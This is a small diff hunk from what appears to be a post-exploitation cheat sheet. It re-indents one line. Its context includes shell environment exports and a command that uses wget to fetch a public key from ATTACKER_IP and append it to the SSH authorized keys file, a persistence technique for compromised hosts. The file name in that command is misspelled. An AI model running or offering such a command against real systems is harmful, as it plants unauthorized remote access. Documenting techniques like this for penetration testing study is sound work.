@@ -63,7 +63,7 @@ Post exploitation
     *$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 export TERM=xterm
 export SHELL=bash*
- Add public key to authorized keys:
+    Add public key to authorized keys:
     *$ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authotized_keys*
 
 
